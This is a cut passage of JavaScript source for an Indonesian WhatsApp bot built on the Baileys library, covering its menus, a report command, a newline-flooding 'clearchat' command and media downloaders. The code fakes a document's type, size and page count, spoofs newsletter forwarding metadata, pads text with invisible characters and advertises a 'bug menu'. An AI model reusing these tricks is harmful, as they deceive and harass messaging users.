╰──▭▬▭▬▭▬▭▬▭──╯


▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʟᴀᴘᴏʀᴋᴀɴ ᴋᴇ ᴄʀᴇᴀᴛᴏʀ ʙᴏᴛ ᴀɢᴀʀ ꜱᴇɢᴇʀᴀ ᴅɪ ᴘᴇʀʙᴀɪᴋɪ, ᴅᴇɴɢᴀɴ ᴄᴏᴍᴍᴀɴᴅ: *.report*`
let menugiff = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

┏━━━━━━⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟━━━━━━
┠✎ *BOTNAME:* ${global.namabot}
┠✎ *RUNTIME:* ${run} 
┠✎ *STATUS:* ${client.public ? `ᴘᴜʙʟɪᴄ` : `sᴇʟғ`}
┠✎ *DATE:* ${hariini}
┠✎ *PLATFORM:* Google Chrome(ubuntu)
┠✎ *PREFIX:* Multi Prefix
┠✎ *VERSION:* 5.0 [ NEW ]
┠✎ *SPEED:*  ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┗━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━━━━⌜ *𝐔𝐒𝐄𝐑-𝐈𝐍𝐅𝐎* ⌟━━━━━━
┠☞ *NAME:* ${pushname}
┠☞ *NUMBER:* ${m.sender.split('@')[0]}
┠☞ *STATUS:* ${statususer}
┗━━━━━━━━━━━━━━━━━━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏━

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.menubug}

${global.menugrup}

${global.menuai}

${global.menudownload}

${global.menusound}

${global.menurandom}

${global.menustalk}

${global.menuinstallpanel}

${global.menujadibot}

${global.menudgtl}

${global.menupanel}

${global.menuowner}`
//setmenunya
if (global.setmenu == "image") {
client.sendMessage(m.chat, { image: menugmbr, caption: teksmenu}, {quoted: qloc})
await sleep(1000) 
await client.sendMessage(m.chat, {audio: {url: `${sound6}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m });
} else if (global.setmenu == "button") {
let sections = [
{
title: '𝐂𝐑𝐄𝐀𝐓𝐎𝐑',
highlight_label: '𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻',
rows: [{
title: 'Creator bot',
description: `Display creator bot`, 
id: `.owner`
}]},
{
title: '𝐋𝐈𝐒𝐓-𝐌𝐄𝐍𝐔',
rows: [{
title: 'ALL MENU',
description: `Displays All Menu`, 
id: `.menu-all`
},
{
title: 'GROUP MENU',
description: `Displays Group Menu`, 
id: `.menu-grup`
},
       {
title: 'AI MENU',
description: `Displays Ai Menu`, 
id: `.menu-ai`
},
{
title: 'DOWNLOADER MENU',
description: `Displays Download Menu`, 
id: `.menu-download`
},
{
title: 'SOUND MENU',
description: `Displays Sound Menu`, 
id: `.menu-sound`
},
{
title: 'DIGITAL-OCEAN MENU',
description: `Displays Dorplet Menu`, 
id: `.menu-dorplet`
},
{
title: 'JADIBOT MENU', 
description: "Displays Jadibot Menu", 
id: `.menu-jadibot`
},
{
title: 'BUG MENU',
description: `Displays Bug Menu`, 
id: `.menu-bug`
},
{
title: 'RANDOM MENU', 
description: "Displays Settings Menu", 
id: `.menu-random`
},
{
title: 'INSTALL PANEL MENU', 
description: "Displays Install Panel Menu", 
id: `.menu-install-panel`
},
{
title: 'STORE MENU', 
description: "Displays Store Menu", 
id: `.menu-store`
},
{
title: 'PANEL MENU', 
description: "Displays Panel Menu", 
id: `.menu-panel`
},
{
title: 'OWNER MENU', 
description: "Displays Owner Menu", 
id: `.menu-owner`
}]
}]

let listMessage = {
    title: '𝐋𝐈𝐒𝐓-𝐌𝐄𝐍𝐔👇', 
    sections
};
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.chjid + "@newsletter",
 newsletterName: 'あ 𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: client.decodeJid(client.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: teksmenu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Ahmad Andhika`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻👿",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/menu.jpg")}, { upload: client.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},
{
name: "cta_url",
buttonParamsJson: "{ display_text: '𝐒𝐀𝐋𝐔𝐑𝐀𝐍-𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏', url: \"https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O\", merchant_url: \"https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O\" }",
},
{
name: "cta_url",
buttonParamsJson: "{ display_text: '𝐒𝐀𝐋𝐔𝐑𝐀𝐍-𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌', url: \"https://t.me/dikatokiichnl\", merchant_url: \"https://t.me/dikatokiichnl\" }",
}
 ]
 })
 })
 }
 }
}, {})

await client.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
await sleep(1000) 
await client.sendMessage(m.chat, {audio: {url: `${sound3}`}, mimetype: 'audio/mp4', ptt: true}, {quoted: m });
} else if (global.setmenu == "gif") {
client.sendMessage(m.chat, { video: fs.readFileSync('./image/menu.mp4'),gifPlayback: true,
 caption: menugiff, contextInfo: {
 externalAdReply: {
containsAutoReply: true,
mediaType: 1,
//mediaUrl: 'https://telegra.ph/file/803e9b20c514befd3cffa.jpg',
renderLargerThumbnail: true,
showAdAttribution: true,
sourceUrl: "https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O",
thumbnailUrl: imageurl,
title: namabot,
body: `${ucapanWaktu} kak ${pushname}`,},},}, { quoted: qloc });
await sleep(1000) 
await client.sendMessage(m.chat, {audio: {url: `${sound1}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
} else if (global.setmenu == "saluran") {
await client.sendMessage(from, {
            document: fs.readFileSync(`./package.json`),
            fileName: global.namabot,
            mimetype: "application/pdf",
            fileLength: '50000000000000',
            pageCount: '999',
            caption: teksmenu,
            contextInfo: {
                mentionedJid: [m.sender, '0@s.whatsapp.net', '6285708112935@s.whatsapp.net'],
                forwardingScore: 10,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363322427078436@newsletter",
                    serverMessageId: 100,
                    newsletterName: "𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻"
                },
                externalAdReply: {
                    title: `${ucapanWaktu} kak ${pushname}`,
                    body: global.namabot,
                    showAdAttribution: true,
                    thumbnail: menugmbr,
                    mediaType: 1,
                    previewType: 0,
                    renderLargerThumbnail: true,
                    mediaUrl: global.ucch,
                    sourceUrl: global.ucch,
                }
            }
        }, { quoted: qloc });
await sleep(1000) 
await client.sendMessage(m.chat, {audio: {url: `${sound5}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m });
} else if (global.setmenu == "button2") {
await client.sendMessage(from, {
  image: {url: "https://j.top4top.io/p_34189jnsj1.jpg"},
  caption: teksmenu, 
  footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '𝐂𝐑𝐄𝐀𝐓𝐎𝐑'
    },
    type: 1,
  },
  {
    buttonId: '.rules',
    buttonText: {
      displayText: '𝐑𝐔𝐋𝐄𝐒'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: '𝐋𝐈𝐒𝐓-𝐌𝐄𝐍𝐔',
        sections: [
{
title: '𝐋𝐈𝐒𝐓-𝐌𝐄𝐍𝐔',
rows: [{
title: 'ALL MENU',
description: `Displays All Menu`, 
id: `.menu-all`
},
{
title: 'GROUP MENU',
description: `Displays Group Menu`, 
id: `.menu-grup`
},
       {
title: 'AI MENU',
description: `Displays Ai Menu`, 
id: `.menu-ai`
},
{
title: 'STALKER MENU',
description: `Displays Stalk Menu`, 
id: `.menu-stalk`
},
{
title: 'DOWNLOADER MENU',
description: `Displays Download Menu`, 
id: `.menu-download`
},
{
title: 'SOUND MENU',
description: `Displays Sound Menu`, 
id: `.menu-sound`
},
{
title: 'DIGITAL-OCEAN MENU',
description: `Displays Dorplet Menu`, 
id: `.menu-dorplet`
},
{
title: 'BUG MENU',
description: `Displays Bug Menu`, 
id: `.menu-bug`
},
{
title: 'JADIBOT MENU', 
description: "Displays Jadibot Menu", 
id: `.menu-jadibot`
},
{
title: 'RANDOM MENU', 
description: "Displays Settings Menu", 
id: `.menu-random`
},
{
title: 'INSTALL PANEL MENU', 
description: "Displays Install Panel Menu", 
id: `.menu-install-panel`
},
{
title: 'STORE MENU', 
description: "Displays Store Menu", 
id: `.menu-store`
},
{
title: 'PANEL MENU', 
description: "Displays Panel Menu", 
id: `.menu-panel`
},
{
title: 'OWNER MENU', 
description: "Displays Owner Menu", 
id: `.menu-owner`
}]
},
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qloc })
await sleep(1000)
await client.sendMessage(from, { audio: { url: `${sound6}` }, mimetype: 'audio/mp4', ptt: true }, {quoted: m});
}
}
break

case 'report': {
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
var teks = `*| REPORT FITUR |*`
var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `\n\nSucces send to creator bot`
var bg_lexxy = '6285708112935@s.whatsapp.net'
client.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:m})
client.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:m})
}
break

case "clearchat": 
return reply(`.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..........Dikzz 085850185698.............\n\n\n\n\n\n\n\n\n\n`)
break

case 'smeme2': {
if (!/webp/.test(mime) && /image/.test(mime)) {
client.sendMessage(from, {react: {text: "🔎", key: m.key}})
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await client.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
let stiker = await sticker5(smeme, false, ``, author)
if (stiker) return client.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Kirim/kutip gambar dengan caption ${prefix+command} San|Abc`)
}}
break
case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await client.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: client.waUploadToServer })
